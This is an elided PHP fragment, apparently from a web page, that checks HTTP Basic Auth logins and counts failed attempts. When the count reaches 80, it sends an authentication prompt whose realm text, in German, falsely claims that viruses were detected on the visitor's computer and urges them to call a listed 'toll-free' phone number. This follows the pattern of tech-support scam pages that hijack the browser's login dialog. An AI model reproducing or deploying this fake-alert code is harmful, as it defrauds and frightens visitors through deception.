<?php
    ...
    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {
        ...
        if($_SESSION['login_attempts'] == 80){
           ...
           header('WWW-Authenticate: Basic realm="Verdächtige Aktivitäten auf Ihrer IP-Adresse aufgrund schädlicher Viren auf Ihrem Computer erkannt. Rufen Sie jetzt gebührenfrei an @ +43-670-3080-200 für jede Unterstützung. "');
